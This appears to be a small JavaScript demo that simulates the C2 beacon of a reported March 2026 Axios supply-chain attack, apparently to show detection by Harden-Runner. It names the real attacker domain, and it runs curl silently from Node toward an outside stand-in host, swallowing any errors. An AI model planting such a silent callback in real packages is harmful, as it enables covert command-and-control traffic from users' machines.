// Demo: simulates the C2 callback from the Axios March 2026 attack.
// Real attack called sfrclak.com:8000 (domain now dead/unresolvable).
// Uses execSync+curl so the TCP connection completes before the process exits,
// making it visible in Harden-Runner's network event log.
var execSync = require('child_process').execSync;
try {
  execSync(
    'curl -s --max-time 3 "http://httpbin.org/get?c2=plain-crypto-js&v=4.2.0" -o /dev/null',
    { timeout: 5000 }
  );
} catch(e) {}
